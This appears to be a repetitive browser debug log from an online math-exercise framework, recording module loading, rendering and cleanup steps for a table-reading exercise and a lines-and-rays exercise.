undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created loading and rendering reading_tables_2 loaded reading_tables_2, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for reading_tables_2 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (word-problems not a fn; src undefined) validator created startTask... startTask got task recognizing_rays_lines_and_line_segments renderExerciseTask recognizing_rays_lines_and_line_segments (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup 